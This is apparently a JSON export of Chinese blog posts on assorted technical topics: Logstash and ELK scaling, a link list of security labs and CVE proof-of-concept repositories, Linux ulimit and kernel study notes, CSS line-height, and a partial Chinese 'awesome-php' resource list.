插件组成。\n消息队列作为数据采集的缓冲与故障转移的保护。\nFILTER层从消息队列中获取数据进行解析和其他操作。\nindexing层将处理的数据传输到ES。\n\n这其中的每一层都可以通过增加计算资源进行扩展。随着你使用场景的发展与所需资源的增加，定期检查这些组件的性能。当Logstash一旦遇到输入的瓶颈，可考虑增加消息队列的存储。相反，通过增加更多的Logstash输出实例来增加ES集群的写入速率。\n\n [译] ELK日志中心分布式架构的逐步演化\n\n  摘要：本文属于原创，欢迎转载，转载请保留出处：https://github.com/jasonGeng88/blog\n\n当前环境\nlogstash：5.2\n\n 说明\n记得写 “基于ELK+Filebeat搭建日志中心” 时，有朋友跟我说：“你的日志中心缺少了消息队列。” 是的，没有考虑。因为暂时用不到，架构的演变一定是根据业务的发展逐步完成的。我觉得任何东西，太少或太过都未必是好事。构架能满足公司当前的发展，那就是好的。\n\n当然我不是指架构可以随意设计，只要满足需求就好。我们设计的架构，满足现有需求当然是先决条件，但还得看得到可预见的未来，为架构的演进预留一定的扩展性。\n\n所以架构既得满足公司业务，还要参考一些成熟的方案，不能生搬硬套。这也是我也这篇文章的原因，自知能力有限，要讲分布式我肯定讲不好，其中势必有很多坑。所以借鉴官网原文，给目前或今后要做分布式的同学一点建议（当然也包括我~）。\n\n这里我不会对原文逐字翻译，会根据自己的理解，以我自己能看懂的表述来翻译给大家看。\n\n原文链接\n\nhttps://www.elastic.co/guide/en/logstash/current/deploying-and-scaling.htmldeploying-and-scaling\n\n译文\n\n 概述\n当Logstash的使用场景逐步演进时，我们之前的架构也将随之发生改变。本文讨论了在复杂度逐渐递增下的Logstash架构一系列的演变过程。我们先从一个最简单的架构开始，然后在此架构上来逐渐增加内容。本文的示例是将数据写入到了ES（Elasticsearch）集群，其实Logstash可以写的输出源非常多。\n\n最简架构\nLogstash最简单的架构可以由一个Logstash实例和一个ES实例组成，两者直接相连。按照Logstash的处理流程，我们使用了一个收集数据的INPUT插件和一个数据写入ES的OUTPUT插件，最后按照实例配置文件上的固定配置，启动Logstash。配置文件中，INPUT插件与OUTPUT插件是必须的，且OUTPUT默认输出方式是stdout，FILTER是可选的，下文会讲到。\n\n 引入 Filters\n日志数据默认是无结构化的，经常包含一些无用信息，有时也会丢失一些本可从日志中获取的相关信息。你可以使用FILTER插件来解析你的日志，从中提取有效字段，剔除无用的信息，还可以从有效字段中衍生出额外信息。例如，filters可以从IP地址中衍生出地理信息，将其添加进日志中，也可以使用grok filter解析文本信息，使其结构化。\n\n当然，添加FILTER插件对性能是有一定影响的。这取决于FILTER插件执行的计算量，以及处理的日志大小。grok filter的正则计算尤其占用资源。解决资源消耗大的一种方式是利用计算机多核的特性进行并行计算。使用 -w 参数来设置 Logstash filter 任务的执行线程数。例如，bin/logstash -w 8 命令使用的是8个不同的线程来处理filter。\n\n引入 Filebeat\nFilebeat 是一款有Go语言编写的轻量级日志收集工具，主要作用是收集当前服务器上的日志，并将收集的数据输出到目标机器上进行进一步处理。Filebeat 使用 Beats 协议与Logstash实例进行通信。使用 Beats input 插件 来配置你的Logstash的实例，让其能够接收Beats传来的数据。\n\nFilebeat使用的是源数据所在机器的计算资源，Beats input 插件最小化了Logstash实例的资源需求，这种架构对于有资源限制要求的场景来说，非常有用。\n\n 引入ES集群\n\nLogstash 一般不与ES的单节点进行通信，而是和多个节点组成的ES集群进行通信，采用的协议默认是HTTP。\n\n你可以使用ES提供的REST API接口向集群写入数据，传输的数据格式为JSON。使用REST接口在代码中不需要引入JAVA的客户端类或任何额外的JAR包。相比节点协议与传输格式，没有性能上的弊端。若要做到接口安全通信，可以使用 X-Pack Security ，它支持SSL与HTTP basic的安全校验。\n\n当你使用HTTP协议时，可以在Logstash的 ES output 插件配置中，提供ES集群的多个请求地址，ES的请求将自动做到负载均衡。多个ES节点通过路由流量到活跃节点的方式也为ES集群提供的高可用性。\n\n你也可以使用ES的 JAVA API将数据序列化为二进制后，再进行传输。该协议可以嗅探请求的地址，你可以选择集群中任意的客户端或节点进行通信。\n\n使用HTTP，可以将ES集群与Logstash实例相分离。 与此相反，节点协议把运行Logstash实例的机器作为一个运行中的ES节点，与ES集群连接在了一起。数据同步是将数据从一个节点传输至集群中的其余节点。当该机器作为集群的一部分，该段网络拓扑变得可用，对于使用相对少量持久连接的场景来说，使用节点协议是较合适的。\n\n你也可以使用第三方的负载均衡硬件或软件，来处理Logstash与外部应用的连接。\n\n注意：确保你的Logstash配置不直接连接到ES管理集群的主节点上。将Logstash连接到客户端或数据节点上，来保护ES集群的稳定性。\n\n使用消息队列处理吞吐量峰值\n\n当Logstash接收数据的能力超过了ES集群处理数据的能力时，你可以使用消息队列来作为缓冲。默认情况下，当数据的处理速率低于接收速率，Logstash的接收将产生瓶颈。由于该瓶颈会导致事件在数据源中被缓冲，所以使用消息队列来抗压将成为你架构中的重要环节。\n\n添加一个消息队列到你部署的Logstash中，对数据丢失也提供了一定的保护。当Logstash实例在消息队列中消费数据失败时，数据将会在另一个活跃的Logstash中重新消费。\n\n目前市面上提供的第三方消息队列，如Redis，Kafka，RabbitMQ。Logstash都提供了相应的input、output插件与之做集成。当Logstash的部署中添加了消息队列，Logstash的处理将分为两个阶段：第一阶段（传输实例），负责处理数据采集，并将其存入消息队列；第二阶段（存储实例），从消息队列中获取数据，应用所配置的filter，将处理过的数据写入ES中。\n\n 采用多连接保证Logstash高可用\n\n为了使Logstash架构更适应单节点不可用的情况，，你可以在数据源与Logstash集群间建立负载均衡。这个负载均衡管理与Logstash实例的连接，保证了在单个实例不可用的情况下，数据采集与处理的正常进行。\n\n上面的架构中存在一种问题，每个Logstash实例都只提供一种INPUT。当某一个实例不可用时，该类型的数据将无法继续收集，例如RSS订阅或文件输入。为了使INPUT的处理更健壮，每个Logstash实例都要配置多个input通道，如下图：\n\n该架构基于你配置的INPUT，可以并行工作。对于更多的INPUT输入，你可以增加更多的Logstash实例来进行水平扩展。这也增加了架构的可靠性，消除了单点故障。\n\nLogstash的扩展\n\n一个成熟的Logstash部署有以下几方面：\n\nINPUT层从数据源中采集数据，由合适的input 插件组成。\n消息队列作为数据采集的缓冲与故障转移的保护。\nFILTER层从消息队列中获取数据进行解析和其他操作。\nindexing层将处理的数据传输到ES。\n\n这其中的每一层都可以通过增加计算资源进行扩展。随着你使用场景的发展与所需资源的增加，定期检查这些组件的性能。当Logstash一旦遇到输入的瓶颈，可考虑增加消息队列的存储。相反，通过增加更多的Logstash输出实例来增加ES集群的写入速率。","tags":null},{"location":"//blog.pytool.com/Hacker/2015-01-29 资源整理","title":"网络安全知识库","text":"---\n\nCVE poc\n Vulnerability Labs for security analysis\ngithub.com/nixawk/labs\ngithub.com/qazbnm456/awesome-cve-poc\ngithub.com/qazbnm456/awesome-web-security\n 靶场\ngithub.com/vulhub/vulhub\ngithub.com/Medicean/VulApps\ngithub.com/tengzhangchao/Sec-Box\n\npaper.seebug.org\nWebsec-网络安全导航\n安全导航\n渗透导航师\n\nhttps://github.com/Hack-with-Github\n知道创宇\n知道创宇研发技能表v2.2\n蓝讯\nWooYun\n安全脉搏\n习科Silic Security\n\nlegends\nEvi1cg's blog \nNuclear'Atk\n邪恶十六进制\n\n渗透测试研究中心\n\n绿盟科技博客","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/sync","title":"golang中sync.RWMutex和sync.Mutex区别","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang proxy user-agent","title":"Go语言 proxy","text":"package main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/corpix/uarand\"\n)\n\nfunc main() {\n\tfmt.Println(uarand.GetRandom())\n}","tags":null},{"location":"//blog.pytool.com/basic/2015-01-01 simplelinux","title":"朴素linux","text":"﻿a name=\"top\"/a\n\nh1 align=\"center\"b朴素linux/b/h1\n\n　　大学里我坚持的最久的一项任务就是自学 linux 内核，\n虽然以后可能也没机会从事 linux 内核方面的工作，\n但是至少提升了自己的编程水平。\n\n　　linux 最新内核的源代码已经没有进行全面研究的可能了，\n我看的是 linux0.01 的内核源码。\n没有指导直接看源代码是不太容易看懂的，\n因为其中涉及到不少硬件操作的规范，\n《linux内核完全注释2.01》——赵炯 著\n对早期linux内核的分析是最详细的，真的达到了完全注释的地步，\n虽然书里分析的是 linux0.11 的源代码，\n但相对于 0.01 的改动不多。\n\n　　而最新的内核由于巨大的代码量，\n要达到源代码的完全注释应该是不可能的了，\n但是从大粒度上进行的分析也是很有价值的。\n《Linux内核设计与实现》英文名为\nLinux kernerl Development ，\n是 Robert Love 所著，陈莉君、康华、张波 翻译的，\n我从这本书中了解了最新内核的进程调度思想。\n\n　　还有一本书，书名是《LINUX内核源代码情景分析》\n毛德操 胡希明 著，这本书对于 PCI\n总线操作规范的介绍可谓完全注释。为什么我会看 PCI\n总线的操作？因为现在的电脑都是用 PCI 而非早期的 ISA\n总线了，linux0.01 对硬盘的操作使用 ISA 规定的固定端口，\n而 PCI 总线中的硬盘的端口是动态设定的，\n与 ISA 时的端口不一致了，所以如果想用 linux0.01\n读写我本机的硬盘的话就得加入 PCI 的功能，\n所以我才看关于最新内核的书，我是被逼的。\n\n　　就快要毕业去工作了，想着写几篇文章同大家分享一下\nlinux 和 C 语言方面的底层知识。那些既想了解底层\n又不愿意系统地看源代码或操作系统方面书籍的同学可以来看看，\n就当是看一部小说吧。\n这个系列的名字叫b朴素linux/b。\n\n　　以下是目录，目录随着进度变更，\n还有可能被重新分类整理，请见谅。\n\na name=\"content\"/a\n\n解剖C语言\n\t照妖镜和火眼金睛 \\2012/11/8更新  \n\t怎么获得C语言翻译后的汇编代码，怎么获得消除宏的C源程序\n\t局部变量 \\2012/11/12更新  \n\ti=3; (++i)+(++i)+(++i) 不同编译器结果不同，怎么看它们的运算过程。\n\t全局变量 \\2012/11/8上线  \n\t全局变量与局部变量在访问方式上有什么不同\n\t函数调用 \\2012/11/9上线  \n\t调用一个函数的前前后后\n\t值传递 \\2012/11/11上线  \n\tC语言只有值传递，怎么修改外部变量\n\t数组与指针 \\2012/12/23更新  \n\t数组的起始地址存在哪儿？\n\t字符串 \\2012/11/15上线  \n\t为什么有的字符串不能修改\n\t结构体 \\2012/11/17上线  \n\t结构体与子元素什么关系，数组不能复制？\n\t奇怪的宏 \\2012/11/19上线  \n\tdo{...} while(0)是何用意\n\t10. 内存对齐 \\2012/11/28更新  \n\t为什么要进行内存对齐，怎么关闭内存对齐\n\t11. 函数帧 \\2012/11/24上线  \n\t函数的局部环境：函数帧\n\t12. 函数帧应用一：谁调用了main？ \\2012/11/27上线  \n\t不复杂\n\t13. 函数帧应用二：所有递归都可以变循环 \\2012/11/30上线  \n\t真的可以\n\t14. 未初始化全局变量 \\2012/12/3上线  \n\t未初始化全局变量 不跟 初始化全局变量 存一块儿\n\t15. 进程内存分布 \\2012/12/6上线  \n\t全局变量、堆、栈 在哪儿？访问它们的特点\n\t16. 编译优化 \\2012/12/9上线  \n\tC语言比汇编慢，怎么优化编译过程\n\t17. static变量 及 作用域控制 \\2012/12/12上线  \n\t压缩变量的作用域，提高源代码的可读性\n\t18. 变量名、函数名 \\2012/12/15上线  \n\t变量名、函数名在哪里终结，有什么用？\n\t19. 函数指针 \\2012/12/18上线  \n\t函数指针跟普通指针有什么区别\n\t20. 可变参数 \\2012/12/21上线  \n\t可变参数怎么实现的？变参函数的可行性？\n\t21. C语言的栈是静态的 \\2012/12/23上线  \n\t变参函数力不能及的地方\n\t22. 内联汇编 \\2012/12/24上线  \n\tgcc 以及 VC 的内联汇编\n\t23. 汇编实现的动态栈 \\2012/12/25上线  \n\t实现一个运行时的接受可变参数的printf\n内核小知识\n\tlinux0.01进程时间片的消耗和再生 \\2012/11/7更新\n\tlinux2.6.XX进程切换和时间片再生 \\2012/11/7上线","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS十日谈/2013-12-10-the-second-day-talk-about-lineheight","title":"第二天，谈谈【line-height】","text":"先来看MDN上的总结：\n  - On block level elements, the line-height CSS property specifies the minimal height of line boxes within the element.\n  - On non-replaced inline elements, line-height specifies the height that is used in the calculation of the line box height.\n  - On replaced inline elements, like buttons or other input element, line-height has no effect.sup\\[1]sup\n\n也就是说：\n\n 在block level elements（块元素）上使用line-height，也就指定了块元素内部line boxes的最小高度\n 在non-replaced inline elements上使用line-height，line-height会被用来计算line boxes的高度。\n 在replaced inline elements上使用line-height没有效果。例如：button或者其它input标签。sup\\[1]sup\n\n第3条规则看起来最容易理解，我们先拿它来实验下，看测试用例一：\n\n    .button-1{\n        line-height: 20px;\n    }\n    .button-2{\n        line-height: 30px;\n    }\n    .input-1{\n        line-height: 20px;\n    }\n    .input-2{\n        line-height: 30px;\n    }\n效果如下：\n\n出人意料的是在replaced inline elements上使用line-height居然有效果，与第3条规则不符。注意到第3条规则是有注解的。还好，注解里给出了原因：\n  sub\\[1]sub Neither engine implements the correct behavior with replaced inline elements like buttons. In some cases line-height is allowed to have an effect on them. This is incorrect behavior relative to the specification.\n\n也就是说浏览器都没有正确的实现这一效果。按照CSS规范来看，浏览器在这一效果上都错了。\n\n接着来看第2条规则：\n\n 在non-replaced inline elements上使用line-height，line-height会被用来计算line boxes的高度。\n\n至于到底如何计算，它并没有说明。在介绍计算规则之前，需要先明确几个概念。用代码说话：\n\n    p\n        The ememphasis/em element is defined as \"inline\".\n    /p\n\n显示效果如下：\n\n上面的代码涉及到了四种盒子：\n\n 1 . block-level boxes（块级盒），由代码中的p标签产生，它可以包含其它的box。\n\n \n\n 2 . inline-level boxes（行级盒），在p标签中有一系列的inline-level boxes，如下：\n\n 上面的inline-level boxes可以分为两类，一类是由内联元素产生的，例如em\n\n而余下的两个没有被标签包裹的inline-level boxes就被称为anonymous inline-level boxes（匿名行级盒），如下：\n\n 3 . line box，由inline-level boxes连接而成，每一行称为一个line box\n\n 4 . content area，它是围绕着文字的并且看不见的一种box，它的高度取决于font-size。如下：\n\n概念介绍完了，回到我们的问题上：\n\n**non-replaced inline elements如何根据line-height来计算line boxes的高度*\n\n上面我们说过line box是由inline-level boxes连接而成，所以我们将问题拆成两步：\n\n 先探究line-height与inline-level boxes高度的关系\n 再看inline-level boxes的高度与line box高度的关系\n\n先来看看line-height与inline-level boxes高度的关系，测试用例二：\niframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/DpU9F/5/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n再结合下面这张图\n\n你应该就能看明白了。\n\n我们把line-height: 30px与font-size: 20px的差值10px称为行间距（英文是leading）。那么半行间距（英文是half-leading）就是 10px / 2 = 5px 。半行间距作用在content area的顶部和底部。\n\n很简单，对不对？\n\n但是别忽略了，上面计算的前提是line-height大于font-size，那如果line-height小于font-size会怎么样呢？来看测试用例三：\niframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/Wbp2E/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n我们看到当line-height小于font-size时，inline-level boxes会使用line-height作为自己的高度，此时 content area 会溢出 inline-level boxes ，如下图所示：\n\n那么如果将line-height设置为0会出现啥效果呢？我们以后再探究。\n\n至此，我们说完了line-height与inline-level boxes高度的关系，接下来该看inline-level boxes的高度与line box高度的关系了。记住下面这条规则：\n\n  line box 的高度由它内部 最高的 inline-level boxes 或 replaced element 来决定。\n\n来看测试用例四：\niframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/QGmPX/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n至此，我们终于清楚了line-height与line boxes高度的关系，也就清楚了\nMDN上第2条规则的含义：\n\n 在non-replaced inline elements上使用line-height，line-height会被用来计算line boxes的高度。\n\n需要补充的一点是：line boxes 在它的容器里是紧挨着彼此堆叠到一起的，看下图会更好理解一些：\n\n最后，我们来看第1条规则：\n\n 在block level elements（块元素）上使用line-height，也就指定了块元素内部line\n   boxes的最小高度\n\n理解这一条需要一点想象力，看着下图，开动你的想象力：\n\n想象在每一个line box的起始位置都有一个宽度为零的 inline-level boxes ，我们把这个想象出来的盒子叫做strut（这个名字来源于TeX）。strut会根据继承来的font-size 和 line-height 计算本身所占高度。这个高度也就是所在line boxes*的最小高度。\n\n参考文献：\n\n http://www.w3.org/TR/2011/REC-CSS2-20110607/visudet.html#line-height\n http://www.w3.org/TR/css3-box/\n CSS布局\n 一个关于line-height非常好的PPT，本文部分图片来自这个PPT，需翻墙\n\n说了这么多有关line-height的问题，其实还有好多知识点没有涉及到，比如line-height的继承问题以及0行高问题等等。我们后面会一一探讨。\n\n  [1]: http://htmljs.b0.upaiyun.com/uploads/1386228453943-1.PNG\n  [2]: http://htmljs.b0.upaiyun.com/uploads/1386229490559-2.PNG\n  [3]: http://htmljs.b0.upaiyun.com/uploads/1386242016916-3.PNG\n  [4]: http://htmljs.b0.upaiyun.com/uploads/1386242489515-4.PNG\n  [5]: http://htmljs.b0.upaiyun.com/uploads/1386242699209-5.PNG\n  [6]: http://htmljs.b0.upaiyun.com/uploads/1386243055840-6.PNG\n  [7]: http://htmljs.b0.upaiyun.com/uploads/1386243169014-7.PNG\n  [8]: http://htmljs.b0.upaiyun.com/uploads/1386244313793-8.PNG\n  [9]: http://htmljs.b0.upaiyun.com/uploads/1386245424193-9.PNG\n  [10]: http://htmljs.b0.upaiyun.com/uploads/1386251530759-12.PNG\n  [11]: http://htmljs.b0.upaiyun.com/uploads/1386252833411-13.PNG\n  [12]: http://htmljs.b0.upaiyun.com/uploads/1386300675855-14.PNG\n  [13]: http://htmljs.b0.upaiyun.com/uploads/1386304220478-15.PNG\n","tags":null},{"location":"//blog.pytool.com/Hacker/00_nettools/iptables用法简介","title":"Linux命令 iptables","text":"---\na href=\"http://www.cnblogs.com/ggjucheng/archive/2012/08/19/2646476.html\" id=\"cbposttitle_url\"iptables用法简介/a\n\niptables的基本语法格式","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 ulimit","title":"Linux 资源限制ulimit","text":"---\n先来说说ulimit的硬限制和软限制\n硬限制用-H参数,软限制用-S参数.\nulimit -a看到的是软限制,通过ulimit -a -H可以看到硬限制.\n如果ulimit不限定使用-H或-S,此时它会同时把两类限制都改掉的.\n软限制可以限制用户/组对资源的使用,硬限制的作用是控制软限制.\n超级用户和普通用户都可以扩大硬限制,但超级用户可以缩小硬限制,普通用户则不能缩小硬限制.\n硬限制设定后,设定软限制时只能是小于或等于硬限制.\n1)软限制不能超过硬限制\n2)硬限制不能小于软限制\n3)普通用户只能缩小硬限制,超级用户可以扩大硬限制\n4)硬限制控制软限制,软限制来限制用户对资源的使用\n\n二)关于进程优先级的限制(scheduling priority)\n这里的优先级指NICE值\n这个值只对普通用户起作用,对超级用户不起作用,这个问题是由于CAPSYSNICE造成的.\n例如调整普通用户可以使用的nice值为-10到20之间.\n硬限制nice的限制为-15到20之间.\nulimit -H -e 35\n\n软限制nice的限制为-10到20之间\nulimit -S -e 30\n\n用nice命令,使执行ls的nice值为-10\nnice -n -10 ls /tmp\nssh-BossiP2810  ssh-KITFTp2620  ssh-vIQDXV3333\n\n用nice命令,使执行ls的nice值为-11,此时超过了ulimit对nice的软限制,出现了异常.\nnice -n -11 ls /tmp\nnice: cannot set niceness: Permission denied\n\n三)内存锁定值的限制(max locked memory)\n这个值只对普通用户起作用,对超级用户不起作用,这个问题是由于CAPIPCLOCK造成的.\nlinux对内存是分页管理的,这意味着有不需要时,在物理内存的数据会被换到交换区或磁盘上.\n有需要时会被交换到物理内存,而将数据锁定到物理内存可以避免数据的换入/换出.\n采用锁定内存有两个理由:\n1)由于程序设计上需要,比如oracle等软件,就需要将数据锁定到物理内存.\n2)主要是安全上的需要,比如用户名和密码等等,被交换到swap或磁盘,有泄密的可能,所以一直将其锁定到物理内存.\n\n四)进程打开文件的限制(open files)\n这个值针对所有用户,表示可以在进程中打开的文件数.\n\n例如我们将open files的值改为3\nulimit -n 3\n\n五)信号可以被挂起的最大数(pending signals)\n\n这个值针对所有用户,表示可以被挂起/阻塞的最大信号数量\n\n六)可以创建使用POSIX消息队列的最大值,单位为bytes.(POSIX message queues)\n\n限制POSIX消息队列的最大值为1000个字节\nulimit -q 1000\n\n七)程序占用CPU的时间,单位是秒(cpu time)\n\n用ulimit将程序占用CPU的时间改为2秒,再运行程序.\nulimit -t 2\n\n程序2S后被kill掉了.\n\n八)限制程序实时优先级的范围,只针对普通用户.(real-time priority)\n九)限制程序可以fork的进程数,只对普通用户有效(max user processes)\n程序fork的进程数成倍的增加,这里是14个进程的输出.除自身外,其它13个进程都是test程序fork出来的.\n我们将fork的限定到12,如下:\nulimit -u 12\n\n十)限制core文件的大小(core file size)\n\n如果在当前目录下没有core文件,我们应该调整ulimit对core的大小进行限制,如果core文件大小在这里指定为0,将不会产生core文件.\n这里设定core文件大小为10个blocks.注:一个blocks在这里为1024个字节.\n\nulimit -c 10\n再次运行这个程序\n./test\nSegmentation fault (core dumped)\n\n查看core文件的大小\nls -lh core\n-rw","tags":null},{"location":"//blog.pytool.com/Post/Awesome/2016-03-29 awesome-php-cn","title":"PHP 资源大全中文版","text":"PHP 资源大全中文版\n\n我想很多程序员应该记得 GitHub 上有一个 Awesome - XXX 系列的资源整理。awesome-php 就是 ziadoz 发起维护的 PHP 资源列表，内容包括：库、框架、模板、安全、代码分析、日志、第三方库、配置工具、Web 工具、书籍、电子书、经典博文等。\n\nAwesome 系列虽然挺全，但基本只对收录的资源做了极为简要的介绍，如果有更详细的中文介绍，对相应开发者的帮助会更大。这也是我们发起这个开源项目的初衷。\n\n \n\n 我们要做什么？\n\n基于 awesome-php 资源列表，我们将对各个资源项进行编译整理。\n整理后的内容，将收录在伯乐在线资源频道。可参考已整理的内容：\n  《Snappy：压缩工具的 PHP 扩展》\n  《phy-yaf：一个用C语言编写的php框架》\n\n \n\n如何参与本项目？\n\n从下面的目录来看，本项目的工作量小不了，所以非常期待能有更多程序员一起来参与。\n\n不过加入前，有几个小要求：\n\n英文还不错，能读懂英文并用自己的话复述；\n有 PHP 开发经验；\n\n如有兴趣，请加 QQ：50872495。加 Q 时请注明「PHP大全」\n\n \n\n 本项目的参与者\n\n维护者：tangyouhua\n\n贡献者：cucr、You\n\n注：名单不分排名，不定期补充更新\n\n \n\n奖励计划\n\n虽然奖励可能并不是你加入的主要原因，但还是有必要提一下：\n\n整理超过 20 个资源后，可在伯乐在线上开通打赏；\n每整理 20 个资源，有机会获得技术书籍或各种有意思的创意、极客产品；\n官奖励详情网\n\n \n\n 依赖管理\n\n依赖和包管理库\n\nComposer/Packagist：一个包和依赖管理器 Composer官网/Packagist官网\nComposer Installers：一个多框架Composer库安装器 官网\nPickle：一个PHP扩展安装器 官网\n\n其他的依赖管理\n\n其他的相关依赖管理\n\nSatis：一个静态Composer存储库生成器 官网\nComposition：一个在运行时检查Composer环境的库 官网\nVersion：语义版本的解析和比较库 官网\nNameSpacer：转化下划线到命名空间的库 官网\nPatch Installer：使用Composer安装补丁的库 官网\nComposer Checker：校验Composer配置的工具 官网\n\n 框架\n\nWeb开发框架\n\nSymfony2：一个独立组件组成的框架 官网\nZend Framework 2：另一个由独立组件组成的框架 官网\nLaravel 4：另一个PHP框架 官网\nAura PHP：独立组件的框架 官网\nYii2： 另一个PHP框架 官网\nNette： 另一个由个体组件组成的框架 官网\nPPI Framework 2：一个互操作性框架 官网\nPhalcon：通过C扩展实现的框架 官网\n\n其他框架\n\n其他Web开发框架\n\nSymfony CMF：创建自定义CMS的内容管理框架 官网\nKnp RAD Bundle：Symfony 2的快速应用程序（RAD）包 官网\n\n 框架组件\n\n来自Web开发框架的独立组件\n\nSymfony2 Components：Symfony2组件 官网\nZend Framework 2 Components：ZF2组件 官网\nAura Components：PHP5.4组件包 官网\nHoa Project：另一个PHP组件包 官网\n\n微型框架\n\n微型框架和路由\n\nSilex：基于Symfony2组件的微型框架 官网\nSlim：另一个简单的微型框架 官网\nBullet PHP：用于构建REST APIs的微型框架 官网\nFast Route：快速路由库 官网\nPux：另一个快速路由库 官网\n\n 其他微型框架\n\n其他相关的微型框架和路由\n\nSilex Skeleton：Silex的项目架构 官网\nSilex Web Profiler：Silex web调试工具条 官网\nStack： Silex/Symfony的可堆叠中间件库 官网\nSlim Skeleton：Slim架构 官网\nSlim View：Slim的自定义视图集合 官网\nSlim Middleware：Slim的自定义中间件集合 官网\n\n模板\n\n模板化和词法分析的库和工具\n\nTwig：一个全面的模板语言 官网\nTwig Cache Extension：一个用于Twig的模板片段缓存库 官网\nMustache：一个Mustache模板语言的PHP实现 官网\nPhly Mustache：另一个Mustache模板语言的PHP实现 官网\nMtHaml： 一个HAML 模板语言的PHP实现 官网\nPHPTAL：一个 TAL 模板语言的PHP实现 官网\nPlates：一个原生PHP模板库 官网\nLex：一个轻量级模板解析器 官网\n\n 静态站点生成器\n\n预处理工具来生成Web页面的内容。\n\nSculpin：转换Markdown和Twig为静态HTML的工具 官网\nPhrozn： 另一个转换Textile，Markdown和Twig为HTML的工具 官网\n\nHTTP\n\n用于HTTP和网站爬取的库\n\nGuzzle：一个全面的HTTP客户端 官网\nBuzz：另一个HTTP客户端 官网\nRequests：一个简单的HTTP库 官网\nHTTPFul：一个链式HTTP库 官网\nGoutte：一个简单的web爬取器 官网\nPHP VCR：录制和重放HTTP请求的库 官网\n\n URL\n\n解析URL的库\n\nPurl：一个URL处理库 官网\nPHP Domain Parser：一个本地前缀解析库 官网\n\nEmail\n\n发送和解析邮件的库\n\nSwiftMailer：一个邮件解决方案 官网\nPHPMailer：另一个邮件解决方案 官网\nFetch：一个IMAP库 官网\nEmail Reply Parser：一个邮件回复解析库 官网\nStampie：邮件服务库，不如 SendGrid, PostMark, MailGun 和 Mandrill. 官网\nCssToInlineStyles：一个在邮件模板内联CSS的库 官网\n\n 文件\n\n文件处理和MIME类型检测库\n\nGaufrette：一个文件系统抽象层 官网\nFlysystem：另一个文件系统抽象层 官网\nCanal：一个检测互联网媒体类型的库 官网\nApache MIME Types：一个解析Apache MIME类型的库 官网\nFerret：一个MIME检测库 官网\nHoa Mime：另一个MIME检测库 官网\nLurker：一个资源跟踪库 官网\nPHP File Locator：一个在大型项目定位文件的库 官网\nPHP FFmpeg：一个用于FFmpeg 视频包装的库. 官网\nCSV：一个CSV数据处理库 官网\n\n流\n\n处理流的库\n\nStreamer：一个面向对象的流包装库 官网\n\n 依赖注入\n\n实现依赖注入设计模式的库\n\nPimple：一个小的依赖注入容器 官网\nAuryn：另一个依赖注入容器 官网\nOrno DI：另一个可伸缩的依赖注入容器 官网\nPHP DI：一个使用注释实现的依赖注入 官网\nAcclimate：一个依赖注入容器和服务定位的通用接口 官网\n\n图像\n\n处理图像的库\n\nImagine：一个图像处理库 官网\nPHP Image Workshop：另一个图像处理库 官网\nIntervention Image：另一个图像处理库 官网\nGIF Frame Extractor：一个提取GIF动画帧信息的库 官网\nGIF Creator：一个通过多张图片创建GIF动画的库 官网\nImage With Text：一个在图像中嵌入文本的库 官网\nColor Extractor：一个从图像中提取颜色的库 官网\n\n 测试\n\n测试代码和生成测试数据的库\n\nPHPUnit：一个单元测试框架 官网\nDBUnit：PHPUnit的数据库测试库 官网\nParaTest：PHPUnit的并行测试库 官网\nPHPSpec：基于功能点设计的单元测试库 官网\nCodeception：一个全栈测试框架 官网\nAspectMock： PHPUnit/ Codeception 模拟框架。 官网\nAtoum：一个简单的测试库 官网\nMockery：一个用测试的模拟对象库 官网\nPhake：另一个用测试的模拟对象库 官网\nProphecy：一个可选度很高的模拟框架 官网\nFaker：一个伪数据生成库 官网\nSamsui：另一个伪数据生成库 官网\nAlice：富有表现力的一代库 官网\nBehat：一个行为驱动开发（BDD）测试框架 官网\nPho：一个行为驱动开发测试框架 官网\nMink：Web验收测试 官网\nHTTP Mock：一个在单元测试模拟HTTP请求的库 官网\nStream：一个用于测试的虚拟文件系统流的包装器 VFS 官网\nVFS：另一个用于测试虚拟文件系统 官网\nLocust：一个用Python编写的现代加载测试库 官网\n\n持续集成\n\n持续集成的库和应用\n\nTravis CI：一个持续集成平台 官网\nPHPCI：一个PHP的开源持续集成平台 官网\nSismo：一个持续测试服务库 官网\nPHP 支持Jenkins一个 官网的持续集成平台\nJoliCi：一个用PHP编写的由Docker支持的持续集成客户端 官网\n\n 文档\n\n生成项目文档的库\n\nSami：一个API文档生成器 官网\nAPIGen：另一个API文档生成器 官网\nPHP Documentor 2：一个API文档生成器 官网\nphpDox：一个PHP项目的文档生成器（不限于API文档） 官网\n\n安全\n\n生成安全的随机数，加密数据，扫描漏洞的库\n\nHTML Purifier：一个兼容标准的HTML过滤器 官网\nRandomLib：一个生成随机数和字符串的库 官网\nTrue Random：使用 www.random.org生成随机数的库 官网\nSecurityMultiTool：一个PHP安全库 官网\nPHPSecLib：一个纯PHP安全通信库 官网\nTCrypto：一个简单的键值加密存储库 官网\nIDS： 一个结构化的PHP安全层 PHP 官网\nSSH：一个试验的面向对象的SSH包装库 PHP 官网\nIniScan：一个扫描PHP INI文件安全的库 官网\nSensioLabs Security Check：一个为检查Composer依赖提供安全建议的web工具 官网\nZed：一个集成的web应用渗透测试工具 官网\n\n 密码\n\n处理和存储密码的库和工具\n\nCompat：一个新的PHP5.5密码函数的兼容库 Password 官网\nphpass： 一个便携式的密码哈希框架 官网\nPHP Password Lib：一个生成和校验密码的库 官网\nPassword Policy： 一个PHP和JavaScript的密码策略库 官网\nPassword Validator： 校验和升级密码哈希的库 官网\nZxcvbn PHP：一个基于Zxcvbn JS的现实的PHP密码强度估计库 官网\n\n代码分析\n\n分析，解析和处理代码库的库的工具\n\nPHP Parser：一个PHP编写的PHP解析器 官网\nPHPPHP： 一个PHP实现的PHP虚拟机 官网\nPHPSandbox：一个PHP沙盒环境 